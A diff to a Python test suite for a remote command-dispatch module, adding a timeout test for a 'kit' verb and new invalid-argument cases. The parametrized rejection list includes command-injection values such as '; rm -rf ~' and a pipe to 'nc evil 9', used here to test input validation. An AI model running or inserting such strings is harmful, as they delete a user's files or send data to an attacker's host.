@@ -209,7 +209,20 @@ def test_timeout_defaults_per_verb_and_can_be_overridden(monkeypatch):
         mesh.VERB_TIMEOUT_S["publish_branch"], 7]
 
 
+def test_kit_goes_out_as_the_bare_verb_with_a_30_s_ceiling(monkeypatch):
+    fake = FakeRun(stdout=_reply(verb="kit", result={"role": True}))
+    monkeypatch.setattr(subprocess, "run", fake)
+    out = mesh.dispatch("contabo", "kit")
+    assert out == {"ok": True, "verb": "kit", "result": {"role": True}}
+    (argv, kw), = fake.calls
+    assert argv[-1] == "kit"
+    assert kw["timeout"] == mesh.VERB_TIMEOUT_S["kit"] == 30
+
+
 @pytest.mark.parametrize("verb,args", [
+    ("kit", ("x",)),
+    ("kit", ("--fetch",)),
+    ("kit", ("core=/tmp",)),
     ("pid_alive", (f"{TID}; rm -rf ~",)),
     ("pid_alive", (f"{TID} && id",)),
     ("pid_alive", (f"{TID}|nc evil 9",)),
